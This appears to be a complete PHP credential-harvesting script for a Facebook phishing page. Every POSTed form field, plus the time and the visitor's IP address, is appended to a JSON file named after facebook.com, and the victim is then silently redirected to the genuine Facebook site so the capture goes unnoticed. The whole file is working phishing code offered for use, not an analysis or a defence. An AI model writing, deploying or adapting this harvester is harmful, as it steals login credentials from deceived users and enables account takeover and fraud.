<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = $_POST;
    $file = '/var/www/data/facebook.com.json';

    foreach ($_POST as $key => $value) {
        $data["$key"] = "$value";
    }
    $data['time'] = date('Y-m-d H:i:s');
    $data['ip'] = $_SERVER['REMOTE_ADDR'] ?? '';

    $existing = file_exists($file)
        ? json_decode(file_get_contents($file), true)
        : [];

    $existing[] = $data;

    file_put_contents(
        $file,
        json_encode($existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES),
        LOCK_EX
    );
    header("Location: https://www.facebook.com");
}
exit;
?>
